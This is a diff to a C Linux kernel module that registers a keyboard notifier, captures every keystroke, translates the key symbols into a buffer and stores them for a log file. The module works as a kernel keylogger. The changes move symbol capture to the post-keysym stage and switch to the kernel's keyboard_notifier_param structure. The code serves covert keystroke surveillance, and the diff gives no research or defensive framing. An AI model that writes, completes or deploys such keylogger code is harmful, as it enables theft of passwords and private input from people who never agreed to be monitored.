@@ -8,19 +8,20 @@
 
 int kstroke_handler(struct notifier_block *, unsigned long, void *);
 
+//log file
+static struct file *log;
+
+//buffer for translated key symbols
+static char trans[BUFLEN];
+
 //notifier block for kbd_listener
 static struct notifier_block nb = {
   .notifier_call = kstroke_handler
 };
 
-//buffer for translated key symbols
-static char trans[BUFLEN];
-
-//log file
-static struct file *log;
-
 /*Called when a key is pressed.
- *Translates the keystroke into a string and writes the string to our log file.
+ *Translates the keystroke into a string and stores them for writing to our log
+ *file in the module's exit function.
  *
  *Parameters:
  *  nb    - notifier block we registered with
@@ -32,26 +33,32 @@ static struct file *log;
  */
 int kstroke_handler(struct notifier_block *nb,
                     unsigned long mode, void *param) {
-
-  keystroke_data *keystroke = param;
+  struct keyboard_notifier_param *kbd_np = param;
 
   switch (mode) {
-    case KBD_KEYCODE : break;
-      //ignore keycodes.
-      //we'll grab keys further down (once the kernel has done some work for
-      //us.)
-    case KBD_UNBOUND_KEYCODE:
-      printk(KERN_ALERT "Unbound\n"); break;
-    case KBD_UNICODE :
-      printk(KERN_ALERT "Unicode   : %x\n", keystroke->value); break;
-    case KBD_KEYSYM :
-      xlate_keysym(keystroke, trans);
+    case KBD_KEYCODE :
+      //ignore keycodes
+      //we'll grab keys further down the line disc (once the kernel has done
+      //some work for us)
       break;
-    case KBD_POST_KEYSYM : break;
+    case KBD_UNBOUND_KEYCODE:
+      printk(KERN_ALERT "Unbound\n");
+      break;
+    case KBD_UNICODE :
+      printk(KERN_ALERT "Unicode   : %x\n", kbd_np->value);
+      break;
+    case KBD_KEYSYM :
+      //igore key symbols *for now*
+      //as before, the kernel will do a little more work for us
+      break;
+    case KBD_POST_KEYSYM :
+      //now grab key symbols and translate them
+      xlate_keysym(kbd_np, trans);
+      break;
     default :
-      printk(KERN_ALERT "Really not sure what happend\n"); break;
+      printk(KERN_ALERT "Really not sure what happend\n");
+      break;
   }
-
   return 0;
 }
 
